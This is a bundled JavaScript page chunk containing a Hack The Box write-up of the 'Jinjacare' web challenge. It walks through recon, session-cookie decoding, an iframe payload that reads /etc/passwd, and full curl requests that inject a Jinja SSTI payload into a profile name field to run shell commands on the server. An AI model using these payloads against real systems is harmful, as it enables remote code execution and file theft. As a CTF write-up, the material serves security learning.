"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[1359],{1086:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Challenges/Jinjacare","title":"Jinjacare","description":"https://app.hackthebox.com/challenges/JinjaCare","source":"@site/docs/Hacking/Write-ups/Hack the box/Challenges/Jinjacare.md","sourceDirName":"Hacking/Write-ups/Hack the box/Challenges","slug":"/write-up/htb/challenges/jinjacare","permalink":"/docs/write-up/htb/challenges/jinjacare","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/challenges/jinjacare","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var r=t(4848),a=t(8453);const o={slug:"/write-up/htb/challenges/jinjacare",pagination_next:null,pagination_prev:null},s="Jinjacare",c={},l=[{value:"Recon",id:"recon",level:2},{value:"SSTI",id:"ssti",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"jinjacare",children:"Jinjacare"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://app.hackthebox.com/challenges/JinjaCare",children:"https://app.hackthebox.com/challenges/JinjaCare"})}),"\n",(0,r.jsx)(n.p,{children:"Jinjacare is a web app for managing COVID-19 vaccination records, allowing users to view history and generate digital certificates. You're invited to identify security vulnerabilities in the system and retrieve the hidden flag from the application."}),"\n",(0,r.jsx)(n.h2,{id:"recon",children:"Recon"}),"\n",(0,r.jsxs)(n.p,{children:["\u2514\u2500$ whatweb ",(0,r.jsx)(n.a,{href:"http://94.237.54.192:47055/",children:"http://94.237.54.192:47055/"}),"\n",(0,r.jsx)(n.a,{href:"http://94.237.54.192:47055/",children:"http://94.237.54.192:47055/"})," [200 OK] Country[FINLAND][FI], Email[",(0,r.jsx)(n.a,{href:"mailto:info@jinjacare.com",children:"info@jinjacare.com"}),"], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], Script, Title[JinjaCare - Home], nginx[1.22.1]"]}),"\n",(0,r.jsx)(n.p,{children:"The source code is not bundled, so we can take a look."}),"\n",(0,r.jsx)(n.p,{children:"Non-logged user interactions:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Login"}),"\n",(0,r.jsx)(n.li,{children:"Register"}),"\n",(0,r.jsx)(n.li,{children:"Verify certificate"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Logged interactions:"}),"\n",(0,r.jsxs)(n.ol,{start:"4",children:["\n",(0,r.jsx)(n.li,{children:"Download certificate"}),"\n",(0,r.jsx)(n.li,{children:"Update personal info"}),"\n",(0,r.jsx)(n.li,{children:"Add record to medical history"}),"\n",(0,r.jsx)(n.li,{children:"Add vaccination record"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"The downloaded certificate has a QR worth exploring... it has the URL to verify the certificate. When verifying the certificate, we get:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Certificate is valid\nName: Test test\n\nIssue Date: 2025-08-02\n\nStatus: Valid\n\nCertificate ID: 4b7c8a77-1d21-43b8-9f95-cdd81ca988fc\n"})}),"\n",(0,r.jsx)(n.p,{children:"So, it's a way of exposing data, we would need to have the certificate ID."}),"\n",(0,r.jsx)(n.p,{children:"Regarding the session cookie:"}),"\n",(0,r.jsx)(n.p,{children:"The value is a signed, URL-safe, possibly zlib-compressed Base64-encoded token."}),"\n",(0,r.jsx)(n.p,{children:"Likely generated using Python\u2019s itsdangerous or Django/Flask session management."}),"\n",(0,r.jsx)(n.p,{children:"You need the secret key to decode it completely and safely."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"from itsdangerous import URLSafeTimedSerializer\n\n# Substitute with your actual secret key\nsecret_key = 'secret'\nserializer = URLSafeTimedSerializer(secret_key)\n\ndecoded = serializer.loads('eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4')\nprint(decoded)\n"})}),"\n",(0,r.jsx)(n.p,{children:"With burp suite, we see the session cookie changes from"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Cookie: session=.eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4\n"})}),"\n",(0,r.jsx)(n.p,{children:"to"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.aI3UXA.CYoLW8CfalTCefLOSG2huGM7ptg\n"})}),"\n",(0,r.jsx)(n.p,{children:"With base64 decode, we got:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-json",children:'{"_fresh": false}\n'})}),"\n",(0,r.jsx)(n.p,{children:"Maybe we can copy the contents of this cookie, to get acess to the dashboard."}),"\n",(0,r.jsx)(n.p,{children:"Most likely, we'll need to get a way to retrieve a UUID and then call the verify"}),"\n",(0,r.jsxs)(n.p,{children:["Doing directory bruteforce, we can find an interesting directory: ",(0,r.jsx)(n.code,{children:"console"}),". Looks like it's a Console // Werkzeug Debugger"]}),"\n",(0,r.jsx)(n.p,{children:"which asks for a PIN. We can compute this PIN, but will need access to the machine itself."}),"\n",(0,r.jsx)(n.p,{children:"The output is reflected in the generated PDF, we might be able to inject some malicious payload in the Full Name field."}),"\n",(0,r.jsx)(n.h2,{id:"ssti",children:"SSTI"}),"\n",(0,r.jsxs)(n.p,{children:["From the downloaded PDF, we can see that is generate with ",(0,r.jsx)(n.code,{children:"whhtmltopdf"}),". Looks like we can break PDF Generation using ",(0,r.jsx)(n.code,{children:"{"})," char. When the full name is set to ",(0,r.jsx)(n.code,{children:"{{{{{"})," the PDF generation breaks with :"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Error generating certificate: unexpected '<'\n"})}),"\n",(0,r.jsx)(n.p,{children:"or with another payload:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"<iframe src=\u201dfile:///etc/passwd\u201d height=\u201d500\u201d width=\u201d500\u201d>\n"})}),"\n",(0,r.jsx)(n.p,{children:"the error is:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Error generating certificate: wkhtmltopdf reported an error: The switch --no-outline, is not support using unpatched qt, and will be ignored.QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root' Exit with code 1 due to network error: ContentNotFoundError\n"})}),"\n",(0,r.jsx)(n.p,{children:"which looks like the output of the command, so we have command injection vulnerability here."}),"\n",(0,r.jsx)(n.p,{children:"However, judging by the name of the challenge, we might be lucky to have simple Jinja template injection on the Full Name field"}),"\n",(0,r.jsx)(n.p,{children:"Call to update the profile"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"curl 'http://94.237.50.221:34050/profile/personal' \\\n  -X POST \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\\n  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\\n  -H 'Accept-Language: en-US,en;q=0.5' \\\n  -H 'Accept-Encoding: gzip, deflate' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -H 'Origin: http://94.237.50.221:34050' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Referer: http://94.237.50.221:34050/profile/personal' \\\n  -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\\n  -H 'Upgrade-Insecure-Requests: 1' \\\n  -H 'Priority: u=0, i' \\\n  --data-raw 'name={{2*2}}&email=test%40test.htb&phone=None&address=None&dateOfBirth=2025-08-05&gender=male&emergencyName=None&emergencyPhone=None&relationship=None'\n"})}),"\n",(0,r.jsx)(n.p,{children:"In the PDF we can see the number 4 reflected, so looks like we have simple template injection working. No need to try to break whtmltopdf to explot the command injection."}),"\n",(0,r.jsxs)(n.p,{children:["According to ",(0,r.jsx)(n.a,{href:"https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection",children:"https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection"}),", the next thing is identify the templating engine, if you look at the tittle of change, there are high chances we're dealing with Jinja templating engine."]}),"\n",(0,r.jsx)(n.p,{children:"We can use SSTI to read the files in the server, and we see there's a flag.txt"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"curl 'http://94.237.50.221:34050/profile/personal' \\\n-X POST \\\n-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \\\n-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \\\n-H 'Accept-Language: en-US,en;q=0.5' \\\n-H 'Accept-Encoding: gzip, deflate' \\\n-H 'Content-Type: application/x-www-form-urlencoded' \\\n-H 'Origin: http://94.237.50.221:34050' \\\n-H 'Connection: keep-alive' \\\n-H 'Referer: http://94.237.50.221:34050/profile/personal' \\\n-H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \\\n-H 'Upgrade-Insecure-Requests: 1' \\\n-H 'Priority: u=0, i' \\\n--data-raw 'name={{config.__class__.__init__.__globals__[\"os\"].popen(\"ls /\").read()}}&email=test%40test.htb&phone=None&address=None&dateOfBirth=2025-08-05&gender=male&emergencyName=None&emergencyPhone=None&relationship=None'\n"})}),"\n",(0,r.jsx)(n.p,{children:"And we got the flag!"})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>s});var i=t(6540);const r={},a=i.createContext(r);function o(e){const n=i.useContext(a);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);